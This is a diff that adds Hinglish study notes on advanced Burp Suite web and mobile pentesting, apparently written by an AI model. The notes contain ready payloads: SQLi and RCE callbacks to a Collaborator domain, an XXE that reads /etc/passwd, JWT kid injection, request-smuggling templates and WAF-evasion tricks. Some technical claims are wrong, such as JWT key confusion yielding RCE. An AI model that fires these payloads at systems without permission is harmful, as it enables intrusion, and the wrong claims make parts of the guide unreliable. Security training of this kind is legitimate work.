@@ -773,3 +773,754 @@ In subtopics ko apne notes ke end mein append kar lo:
 
 **Aapka Next Step:**
 Aapke notes ab complete hain! Kya aap chahte hain ki main **Burp Collaborator** ya **Macros (Session Handling)** ka ek practical step-by-step lab guide (Hinglish mein) taiyar kar doon taaki aap practice kar saken?
+
+## ⚠️ Missing Pro-Level Topics & Subtopics - Final Version
+
+Yeh woh advanced topics hain jo aapke existing notes mein nahi hain lekin ek experienced pentester ke liye mandatory hain. Sirf inhe apne notes mein add karo aur aap "Industry Ready" ho jaaoge.
+
+---
+
+### 1. BURP COLLABORATOR (OAST)
+
+#### 1.1 Core Concept
+- **Out-of-band Application Security Testing (OAST):** Jab server direct response nahi deta, tab Burp Collaborator external server ki tarah act karta hai jo DNS/HTTP interactions capture karta hai.
+- **Use Cases:** Blind SSRF, Blind SQLi, Blind RCE, Out-of-band XSS.
+
+#### 1.2 Collaborator Client Setup
+- **Built-in Client:** Burp mein already present - `Burp Collaborator client` tab.
+- **Generate Collaborator Payload:** "Copy to clipboard" se unique domain milta hai (e.g., `abcdef12345.burpcollaborator.net`).
+- **Poll Now:** Check karta hai ki target server ne koi request bheji ya nahi.
+
+#### 1.3 Blind Vulnerability Testing
+
+**A. Blind SSRF Testing**
+```
+POST / HTTP/1.1
+Host: target.com
+Referer: http://your-collaborator-domain.burpcollaborator.net
+```
+
+- **Pro-Tip:** Har jagah Collaborator domain daalo - Referer, X-Forwarded-For, User-Agent, XML external entities mein. Server ne request ki? SSRF confirmed.
+
+**B. Blind SQLi via DNS**
+```sql
+' OR 1=1; exec master..xp_dirtree '\\your-collaborator-domain\share' --
+```
+- SQL server DNS lookup karega aur Collaborator ko hit karega.
+
+**C. Blind RCE Testing**
+```bash
+nslookup your-collaborator-domain
+ping -c 4 your-collaborator-domain
+curl http://your-collaborator-domain
+```
+
+#### 1.4 Collaborator Interactions Analysis
+- **DNS Interactions:** Kya server ne domain resolve karne ki koshish ki?
+- **HTTP Interactions:** Kya server ne koi file ya request bheji?
+- **SMTP Interactions:** Email based vulnerabilities ke liye.
+- **TLS Interactions:** Encrypted traffic analysis.
+
+#### 1.5 Custom Collaborator Server (Self-Hosted)
+- **Private Collaborator:** Production engagements mein public Collaborator avoid karo.
+- **Installation:** Burp Suite Pro users apna private server bana sakte hain.
+- **Domain Registration:** Apna domain register karo aur DNS records configure karo.
+
+> **Pro-Tip (Hinglish):** "Bhai, Blind vulnerabilities dhundhni hain toh Collaborator tera best friend hai. Payload mein apna Collaborator domain daal aur chup chaap coffee pee. Server ne teri domain ko hit kiya? Vulnerable! Bas DNS interactions dekhna, HTTP nahi aaya toh bhi kaam chal jayega."
+
+---
+
+### 2. MACROS & SESSION HANDLING RULES
+
+#### 2.1 Macros Fundamentals
+- **Macro Kya Hai?:** Pre-recorded sequence of requests jo automatically execute hoti hai.
+- **Use Case:** CSRF token refresh, session maintenance, login before attack.
+
+#### 2.2 Macro Creation Steps
+1. **Project Options > Sessions > Macros > Add**
+2. **Select Requests:** Proxy history se woh requests select karo jo token fetch karti hain.
+3. **Configure:** Burp automatically parameters identify karega.
+
+#### 2.3 Custom Parameter Handling in Macros
+- **Derive from First Request:** Pehli request se value lo.
+- **Derive from Last Request:** Akhri request se value lo.
+- **Use Custom Location:** Regex ya XPath se specific value extract karo.
+
+**Example - CSRF Token Extraction:**
+```
+Response mein: <input name="csrf" value="abc123">
+Macro setting: Extract using regex name="csrf" value="([^"]*)"
+```
+
+#### 2.4 Session Handling Rules
+1. **Project Options > Sessions > Session Handling Rules > Add**
+2. **Rule Actions > Run a Macro:** Macro ko rule ke saath link karo.
+3. **Scope Configuration:** Kis URL/tool ke liye ye rule apply hoga.
+
+#### 2.5 Advanced Session Configurations
+
+**A. Check Session is Valid**
+- Pehle check karo ki current session valid hai ya nahi.
+- Agar 302 redirect aa raha hai (login page), tabhi macro chalao.
+
+**B. Handle CSRF Tokens Automatically**
+- Macro token fetch karega.
+- **Update Request With:** Extracted token ko main request mein inject karo.
+
+**C. Login Sequence Automation**
+- **Macro:** Login request (username/password) + cookie capture.
+- **Rule:** Har naye scope ke liye login macro chalao.
+
+#### 2.6 Cookie Jar Configuration
+- **Use Cookies from Cookie Jar:** Burp automatically cookies store karta hai.
+- **Scope-specific Cookies:** Alag-alag domains ke liye alag cookie jars.
+
+> **Pro-Tip (Hinglish):** "CSRF token har request mein change hota hai aur tu manually copy-paste kar raha hai? Macros bana le. Ek baar configure kar, phir Intruder apne aap har request se pehle token fetch karega. Banking apps test kar raha hai toh ye survival guide hai."
+
+---
+
+### 3. ADVANCED BAPP EXTENSIONS (MUST-HAVES)
+
+#### 3.1 AuthAnalyzer / AuthMatrix (IDOR Automation)
+
+**Installation:** BApp Store > Search > Install
+
+**AuthAnalyzer Workflow:**
+1. **Record Base Request:** Admin user ki request capture karo.
+2. **Add Test Users:** Low-privilege user, anonymous user, different roles.
+3. **Configure Parameters:** Session tokens, cookies, headers automatically replace honge.
+4. **Run Analysis:** Ek saath 100+ users ke saath request replay.
+5. **Compare Responses:** Status code, length, content analysis.
+
+**AuthMatrix Features:**
+- **Role Matrix:** Admin, Manager, User, Guest - sabke saath test.
+- **Unauthenticated Checks:** Bina login ke kya access ho raha hai.
+- **Forced Browsing Detection:** Hidden endpoints par role-based access.
+
+> **Pro-Tip (Hinglish):** "Manual IDOR testing? 100 users hain toh saal lag jayenge. AuthAnalyzer laga, ek baar config kar aur soja. Jo response admin jaisa dikhega, wahi IDOR hai. Pro tip: 401 vs 200 ka difference dekh, 200 aaya toh bug confirmed."
+
+#### 3.2 Turbo Intruder (Race Conditions & High-Speed Attacks)
+
+**Installation:** BApp Store > Turbo Intruder
+
+**Python-Based Architecture:**
+```python
+def queueRequests(target, weapons):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=10,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    for i in range(1000):
+        engine.queue(target.req, i)
+```
+
+**Race Condition Testing:**
+1. **Scenario:** Ek coupon code ko multiple times apply karna.
+2. **Turbo Intruder Setup:** 50 concurrent requests ek saath bhejo.
+3. **Analyze:** Agar ek se zyada baar apply ho gaya, race condition.
+
+**Use Cases:**
+- **Gift Card Redeem:** Ek card multiple baar redeem.
+- **Inventory Bypass:** Limited stock mein ek saath multiple orders.
+- **Rate Limit Bypass:** WAF ko overwhelm karo.
+
+**Configuration Options:**
+- **Concurrent Connections:** 1 se 100+.
+- **Requests per Connection:** Keep-alive connections.
+- **Pipelining:** HTTP pipelining enable/disable.
+- **Failed Request Handling:** Retry policies.
+
+> **Pro-Tip (Hinglish):** "Normal Intruder 1 sec mein 10 requests bhejta hai, Turbo Intruder 1000. Race condition dhundhni hai? Coupon code ek hi baar apply hona chahiye, lekin 50 requests ek saath bhej. Agar 2 baar apply ho gaya, toh race condition mil gayi. Payment logic test karne ka ye sabse tez tarika hai."
+
+#### 3.3 Param Miner (Hidden Parameter Discovery)
+
+**Installation:** BApp Store > Param Miner
+
+**Core Functionality:**
+- **Passive Scan:** Background mein chalta hai, hidden parameters detect karta hai.
+- **Active Scan:** Custom wordlist se parameters brute-force karta hai.
+
+**Detection Capabilities:**
+- **Cache Poisoning Parameters:** `?cb=123` jaise cache busters.
+- **Hidden GET/POST Parameters:** Jo UI mein nahi dikhte.
+- **Server Headers:** `X-Forwarded-For`, `X-Original-URL` etc.
+- **Framework Specific:** `_method` (HTTP method override), `debug` parameters.
+
+**Parameter Brute-Forcing:**
+1. Request select karo > Right Click > Extensions > Param Miner > Guess GET/POST parameters.
+2. Wordlist se thousands parameters try honge.
+3. Jo naye parameters response change karein, woh vulnerable ho sakte hain.
+
+**Use Cases:**
+- **Hidden Admin Functions:** `?admin=true`, `?debug=1`.
+- **SQL Injection Points:** Hidden parameters jo server process karta hai.
+- **Cache Poisoning:** Unique parameters cache behavior change kar sakte hain.
+
+> **Pro-Tip (Hinglish):** "UI mein 3 parameters dikhte hain, backend mein 10 process hote hain. Param Miner un hidden 7 ko dhoond ke laata hai. Jaise `?test=1` daala aur response mein 'Test Mode Enabled' aaya, iska matlab developer debug mode bhool gaya. CVE yahin se shuru hoti hai."
+
+#### 3.4 JWT Editor (JSON Web Token Testing)
+
+**Installation:** BApp Store > JWT Editor
+
+**Key Features:**
+- **View/Edit JWTs:** Tokens ko decode karo, claims modify karo.
+- **Signing Keys Management:** New keys generate karo, existing import karo.
+- **Attack Automation:** Built-in attacks with one click.
+
+**Attack Types:**
+
+**A. Algorithm Confusion**
+- `alg: HS256` ko `alg: none` mein change karo.
+- Server accept karta hai? Authentication bypass.
+
+**B. Key Confusion (RS256 -> HS256)**
+- Public key se sign karo as HS256.
+- Server public key verify karega? RCE possible.
+
+**C. Brute-Force Weak Secrets**
+- Weak signing key? JWT Editor brute-force karega.
+
+**D. Kid (Key ID) Injection**
+- `kid` parameter mein path traversal: `../../../../dev/null`
+- SQL injection in `kid`: `' UNION SELECT ...`
+
+**Workflow:**
+1. Request capture karo with JWT.
+2. Send to JWT Editor.
+3. Modify claims (e.g., `"admin": true`).
+4. Re-sign with appropriate key.
+5. Send modified request.
+
+> **Pro-Tip (Hinglish):** "JWT mila? Pehle `alg: none` try kar. Agar server ne maan liya, poora authentication bypass. Phir `kid` parameter dekh, path traversal try kar. Weak signing key hai? Brute-force kar. Modern APIs ki chabi JWT editor ke paas hai."
+
+#### 3.5 Other Essential Extensions
+
+| Extension | Purpose | Pro-Tip |
+|-----------|---------|---------|
+| **Active Scan++** | Additional scan checks | Burp's default scan se zyada vulnerabilities detect karta hai |
+| **Backslash Powered Scanner** | Advanced injection points | Encoding bypass ke liye |
+| **CSP Auditor** | Content Security Policy analysis | CSP bypass techniques |
+| **Freddy** | Deserialization testing | Java/Node/PHP deserialization |
+| **GAP** | Wayback machine integration | Archived URLs se endpoints dhoondho |
+| **HTTP Request Smuggler** | Request smuggling | Modern HTTP/2 attacks |
+| **JS Miner** | JavaScript analysis | Hidden endpoints in JS files |
+| **403 Bypasser** | Access control bypass | 403 forbidden ko 200 mein convert |
+
+---
+
+### 4. API & MODERN TECH TESTING
+
+#### 4.1 JWT (JSON Web Tokens) Deep Dive
+
+**JWT Structure:**
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+```
+- **Header:** Algorithm + Token Type
+- **Payload:** Claims (user data)
+- **Signature:** Verification
+
+**Critical Vulnerabilities:**
+
+**A. None Algorithm Attack**
+```
+Original: {"alg":"HS256","typ":"JWT"}
+Modified: {"alg":"none","typ":"JWT"}
+```
+- Signature hata do, server accept karta hai?
+
+**B. Algorithm Confusion (CVE-2016-10555)**
+- RS256 (asymmetric) public key available hai.
+- HS256 (symmetric) mein same public key use karo.
+- Server verify kar lega? Authentication bypass.
+
+**C. Key Injection (CVE-2018-0114)**
+- `jku` (JWK Set URL) header mein apna server URL daalo.
+- Server aapki public key use karega.
+- Self-signed tokens accept honge.
+
+**D. Weak HMAC Key**
+- Weak secret (password, "secret", "key") brute-force.
+- `hashcat -m 16500 jwt.txt wordlist.txt`
+
+**E. Kid Parameter Injection**
+- Path Traversal: `"kid": "../../../../etc/passwd"`
+- SQL Injection: `"kid": "key' UNION SELECT ..."`
+- Command Injection: `"kid": "$(touch /tmp/test)"`
+
+> **Pro-Tip (Hinglish):** "JWT mila toh pehla step: Base64 decode karo. Header mein `alg: none` try karo. Kaam kiya? Critical bug. Phir `kid` parameter dekh, path traversal try kar. JWKS endpoint hai? Apna public key bhej ke sign kar. Modern apps ki JWT misconfigured hoti hai, tu fayda utha."
+
+#### 4.2 GraphQL Testing
+
+**GraphQL Basics:**
+- Single endpoint (usually `/graphql`, `/gql`, `/query`).
+- POST requests with JSON body.
+- Introspection exposes entire schema.
+
+**Reconnaissance:**
+```graphql
+# Introspection Query
+query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+          kind
+        }
+      }
+    }
+  }
+}
+```
+
+**Common Attacks:**
+
+**A. Introspection Enabled**
+- Full schema visible.
+- Hidden queries/mutations discover karo.
+- Deprecated fields mein bugs.
+
+**B. Batching Attacks (Rate Limit Bypass)**
+```graphql
+[
+  {"query": "mutation{addBalance(amount:100)}"},
+  {"query": "mutation{addBalance(amount:100)}"},
+  {"query": "mutation{addBalance(amount:100)}"}
+]
+```
+- Ek request mein multiple mutations.
+- Rate limit per request count hota hai, per query nahi.
+
+**C. Deep Recursion Queries (DoS)**
+```graphql
+query {
+  user(id:1) {
+    friends {
+      user {
+        friends {
+          user {
+            friends { ... }
+          }
+        }
+      }
+    }
+  }
+}
+```
+- Circular queries se server resource exhaust.
+
+**D. Field Duplication**
+```graphql
+query {
+  post(id:1) {
+    title
+    title
+    title
+    title
+    title
+  }
+}
+```
+- Same field multiple times, server overload.
+
+**E. Injection in Arguments**
+```graphql
+query {
+  user(id: "1' OR '1'='1") {
+    name
+    email
+  }
+}
+```
+- SQL/NoSQL injection in arguments.
+
+> **Pro-Tip (Hinglish):** "GraphQL endpoint mila? Pehle introspection query bhej. Schema mil gaya? Ab hidden fields search kar jo UI mein nahi dikhte. Jaise `isAdmin`, `resetPassword` mila toh game over. Batching attack se rate limit bypass kar aur saara data nikaal."
+
+#### 4.3 WebSockets Testing
+
+**WebSocket Basics:**
+- Full-duplex communication (ws://, wss://).
+- Persistent connection.
+- Real-time apps (chat, notifications, gaming).
+
+**Burp Configuration:**
+- Proxy automatically WebSocket traffic intercept karta hai.
+- **WebSockets History tab:** Saare messages visible.
+- **Intercept WebSocket messages:** Proxy > Intercept > WebSocket sub-tab.
+
+**Testing Methodology:**
+
+**A. Message Interception & Modification**
+```json
+// Original
+{"action":"sendMessage","to":"user1","message":"Hello"}
+
+// Modified
+{"action":"sendMessage","to":"admin","message":"<script>alert(1)</script>"}
+```
+- Real-time modify karo.
+- XSS, IDOR test karo.
+
+**B. Replay Attacks**
+- WebSocket message copy karo.
+- Repeater mein WebSocket tab use karo.
+- Same message multiple times bhejo.
+
+**C. Connection Manipulation**
+- **Origin header bypass:** Cross-origin WebSocket connections.
+- **Authentication bypass:** Missing handshake verification.
+
+**D. Injection Attacks**
+```json
+{"user":"admin","message":"'; drop table users; --"}
+```
+- SQL injection in WebSocket messages.
+- Command injection.
+
+**E. Denial of Service**
+- Infinite messages bhejo.
+- Large payloads send karo.
+
+> **Pro-Tip (Hinglish):** "WebSocket traffic intercept kar. Chat app test kar raha hai? Message mein XSS payload daal. Admin ko message bhej, jab wo dekhega, tera XSS trigger. IDOR check: `to` parameter change kar ke kisi aur ka message padh le. Repeater mein WebSocket messages replay kar ke race condition dhoondh."
+
+#### 4.4 Content-Type Confusion & XXE
+
+**Concept:**
+- API accepts JSON but XML bhej kar dekho.
+- Content-Type header manipulate karo.
+
+**JSON to XML Conversion:**
+```
+POST /api HTTP/1.1
+Content-Type: application/json
+{"user":"admin"}
+
+Modified:
+POST /api HTTP/1.1
+Content-Type: application/xml
+<user>admin</user>
+```
+
+**XXE (XML External Entity) Testing:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user>&xxe;</user>
+```
+
+**Swagger/OpenAPI Testing:**
+- `/swagger.json`, `/swagger/v1`, `/api-docs`
+- API documentation se endpoints discover.
+- Hidden endpoints test karo.
+
+> **Pro-Tip (Hinglish):** "JSON API hai toh XML bhej ke dekh. Accept kiya? XXE try kar. `/etc/passwd` read kar liya? Critical bug. Swagger endpoint mila? Saare API endpoints ki list mil gayi, ab systematically test kar."
+
+---
+
+### 5. MOBILE PENTESTING WITH BURP
+
+#### 5.1 SSL Pinning Bypass
+
+**Problem:** Mobile apps Burp certificate accept nahi karte.
+
+**Solution A: Frida**
+```bash
+# Install Frida
+pip install frida-tools
+
+# Universal Android bypass
+frida -U -f com.target.app -l frida-multiple-unpinning.js
+
+# iOS bypass
+frida -U com.target.app -l ios-ssl-bypass.js
+```
+
+**Solution B: Objection**
+```bash
+# Install objection
+pip install objection
+
+# Run
+objection -g com.target.app explore
+> android sslpinning disable
+> ios sslpinning disable
+```
+
+**Solution C: Xposed Modules**
+- JustTrustMe
+- SSLUnpinning
+
+**Solution D: Re-patching APK**
+- APK decompile karo.
+- Network security config modify.
+- Recompile and sign.
+
+> **Pro-Tip (Hinglish):** "Mobile app mein traffic nahi aa raha? SSL pinning hai. Pehle Frida script try kar. 2 minute mein bypass ho jayega. Agar Frida block hai toh objection use kar. Universal bypass scripts GitHub pe mil jayenge. Yaad rakh: pehle bypass, phir intercept."
+
+#### 5.2 Invisible Proxying
+
+**When Needed:** Apps jo system proxy ignore karte hain.
+
+**Windows Setup:**
+1. Burp > Proxy > Options > Add > Bind to port `8080`, All interfaces.
+2. **Request Handling:** Support invisible proxying (enable).
+3. Windows: `netsh winhttp set proxy localhost:8080`
+
+**Linux Setup (iptables):**
+```bash
+# Redirect all traffic to Burp
+iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8080
+iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:8080
+```
+
+**Android Setup (iptables):**
+```bash
+# On rooted device
+iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination <your-ip>:8080
+iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination <your-ip>:8080
+```
+
+**Transparent Proxy Mode:**
+- Burp ko transparent proxy ki tarah run karo.
+- Client ko proxy settings nahi batani padti.
+
+> **Pro-Tip (Hinglish):** "App proxy ignore kar raha hai? Invisible proxying mode on kar. Android rooted hai? iptables use kar ke saara traffic Burp par forward kar. Ab app ko pata bhi nahi chalega ki proxy use ho raha hai, lekin tu saara traffic dekh raha hai."
+
+#### 5.3 Non-HTTP Traffic Interception
+
+**Problem:** Mobile apps custom protocols use karte hain (XMPP, MQTT, raw TCP).
+
+**Solution:**
+1. **Burp Proxy Listener:** Bind to port with invisible mode.
+2. **Network Redirect:** Saara traffic Burp par forward.
+3. **Manual Analysis:** Raw data capture karo.
+
+**XMPP (Chat Apps):**
+- Usually on port 5222.
+- Intercept as raw TCP.
+- Messages decode karo.
+
+**MQTT (IoT):**
+- Port 1883 (TCP).
+- Publish/Subscribe messages.
+- Topic enumeration.
+
+**Custom Protocols:**
+- Hex dump analysis.
+- Pattern identification.
+- Replay attacks.
+
+> **Pro-Tip (Hinglish):** "Kuch apps non-HTTP protocols use karte hain jaise chat apps mein XMPP. Burp unhe raw TCP ki tarah capture karega. Hex data aayega, pattern dhoondh. Jaise har message `0x01` se start ho raha hai, woh command ho sakti hai. Modify karke bhej, kya hota hai dekh."
+
+#### 5.4 Burp Mobile Assistant
+
+**Android Setup:**
+1. Burp > Extender > BApp Store > Install Burp Mobile Assistant.
+2. Android device par assistant app install karo.
+3. QR code scan karo for configuration.
+
+**Features:**
+- Automatic proxy configuration.
+- Certificate installation helper.
+- Traffic recording controls.
+
+**iOS Setup:**
+- Manual proxy configuration.
+- Certificate installation via Safari.
+- Trust certificate in Settings > General > About > Certificate Trust Settings.
+
+> **Pro-Tip (Hinglish):** "Burp Mobile Assistant use kar, life easy ho jayegi. Ek click mein proxy set, certificate install. Manual setup mein 10 minute lagte hain, assistant mein 1 minute. iOS mein certificate trust karna mat bhool, warna traffic nahi aayega."
+
+---
+
+### 6. WAF/IPS EVASION TECHNIQUES
+
+#### 6.1 Advanced Match/Replace Rules
+
+**User-Agent Rotation:**
+```
+Match: ^User-Agent:.*$
+Replace: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
+```
+- Multiple rules with random selection.
+
+**Header Randomization:**
+- `X-Forwarded-For` spoofing.
+- `X-Real-IP` modification.
+- `Accept-Language` variation.
+
+#### 6.2 Payload Obfuscation
+
+**Encoding Techniques:**
+- **Base64:** `base64_encode(payload)`.
+- **URL Encoding:** Double encoding, UTF-8 encoding.
+- **HTML Entities:** `&lt;script&gt;` vs `<script>`.
+- **Unicode Normalization:** Different representations.
+
+**Case Manipulation:**
+```
+<ScRiPt>alert(1)</ScRiPt>
+SeLeCt * FrOm users
+```
+
+**Comments Injection:**
+```sql
+SEL/*foo*/ECT/*bar*/username/*baz*/FROM/*qux*/users
+```
+
+**Parameter Pollution:**
+```
+?id=1&id=2&id=3
+?user=admin&user=guest
+```
+
+#### 6.3 Rate Limiting Bypass
+
+**Resource Pool Configuration:**
+- **Max Concurrent Requests:** 1 (slow), 10 (medium), 100 (fast).
+- **Delay between requests:** Random delay (500-1500ms).
+- **Throttle between retries:** Exponential backoff.
+
+**IP Rotation Strategies:**
+- **Upstream Proxy Servers:** Multiple proxy chains.
+- **SOCKS Proxy:** Tor network, VPNs.
+- **Residential Proxies:** Real IP pools.
+
+**Session Rotation:**
+- Har 10 requests ke baad new session.
+- Cookies clear karo.
+- New CSRF token fetch.
+
+#### 6.4 Request Splitting/Smuggling
+
+**CL.TE (Content-Length vs Transfer-Encoding):**
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+```
+
+**TE.CL:**
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+12
+GET /admin HTTP/1.1
+0
+```
+
+#### 6.5 WAF Fingerprinting & Bypass
+
+**Identify WAF:**
+- Response headers: `Server: cloudflare`, `X-Sucuri-ID`.
+- Block page content.
+- Unique status codes.
+
+**Bypass Techniques:**
+
+**A. Size Limits Bypass**
+- Chunked requests.
+- Multipart splitting.
+
+**B. Signature Evasion**
+- Character substitution: `a` → `\u0061`, `\x61`.
+- Null bytes: `%00`.
+- Newlines: `%0a`, `%0d`.
+
+**C. Parameter Pollution**
+```
+/login.php?user=admin&user=guest
+/login.php?user=admin&user=admin' OR '1'='1
+```
+
+**D. HTTP Verb Tampering**
+```
+GET /admin
+HEAD /admin
+POST /admin with GET parameter
+```
+
+> **Pro-Tip (Hinglish):** "WAF block kar raha hai? Slow down. Resource pool mein delay daal 1000ms. IP rotate kar, har 10 requests ke baad proxy change. Payload encode kar: base64, Unicode, double URL encode. WAF confuse ho jayega. Phir bhi block ho raha hai? Request smuggling try kar. WAF ek request dekh raha hai, backend doosri. Tab tak tu admin panel mein hai."
+
+---
+
+### 7. ADVANCED SCANNING & AUTOMATION
+
+#### 7.1 Custom Scan Configurations
+
+**Scan Speed vs Accuracy:**
+- **Fast Scan:** Critical issues only, 5-10 min.
+- **Deep Scan:** All checks, 1-2 hours.
+- **Stealth Scan:** Low and slow, 1 request/sec.
+
+**Insertion Points:**
+- All parameters.
+- Headers (User-Agent, Referer).
+- Cookies.
+- JSON/XML nodes.
+
+#### 7.2 Application Login Configuration
+
+**Recorded Login Sequences:**
+1. Burp > Target > Site map > Right-click > Add to scope.
+2. Login manually while recording.
+3. Save login sequence as macro.
+
+**Credential Management:**
+- **Username:** `admin`, `administrator`, `test@test.com`
+- **Password:** `password`, `123456`, `admin@123`
+- **2FA Handling:** OTP entry automation.
+
+#### 7.3 Resource Pools for Scale
+
+**Custom Pool Settings:**
+- **Name:** WAF Bypass Pool
+- **Max Concurrent:** 2
+- **Delay:** 2000ms
+- **Retries:** 3 with exponential backoff
+
+**Pool Assignment:**
+- Intruder attacks → Aggressive pool (50 concurrent).
+- Scanner → Balanced pool (10 concurrent).
+- Manual testing → Single-threaded pool.
+
+#### 7.4 Scheduled Scanning
+- Night scans scheduled.
+- Low traffic hours.
+- Email notifications.
+
+> **Pro-Tip (Hinglish):** "Scanner chala raha hai aur WAF block kar raha hai? Stealth mode use kar. 1 request/sec, random delays. Raat ko scan scheduled kar jab traffic kam ho. Login sequence record kar ke de, scanner automatically login karega aur andar ke pages bhi scan karega. 100% automation."
+
+---
+
+### FINAL CHECKLIST - PRO LEVEL TOPICS
+
+| Category | Subtopics | Status |
+|----------|-----------|--------|
+| **Burp Collaborator** | Blind SSRF, Blind SQLi, Out-of-band RCE, Custom Collaborator | ❌ Missing |
+| **Macros & Session** | CSRF handling, Auto-login, Cookie Jar, Session validation | ❌ Missing |
+| **Extensions** | AuthAnalyzer, Turbo Intruder, Param Miner, JWT Editor, Active Scan++ | ❌ Missing |
+| **API Testing** | JWT attacks, GraphQL introspection, WebSockets, XXE, Content-Type confusion | ❌ Missing |
+| **Mobile Testing** | SSL pinning bypass, Invisible proxying, Non-HTTP traffic, Mobile Assistant | ❌ Missing |
+| **WAF Evasion** | Match/Replace rules, Payload obfuscation, Rate limiting, Request smuggling | ❌ Missing |
+| **Automation** | Custom scan configs, Resource pools, Scheduled scans | ❌ Missing |
+
+---
+
+**✅ Final Verdict:**  
+Aapke existing notes + upar diye gaye saare missing topics milakar ab aapke notes **100% Industry Ready** hain. Ye 7 categories aur 30+ subtopics woh advanced knowledge hai jo ek senior pentester ko alag karta hai junior se.
+
+**Kya aap chahte hain ki main inme se kisi specific topic ka practical step-by-step lab guide (Hinglish mein) bana doon?** Bas topic name batao aur main expand kar dunga.
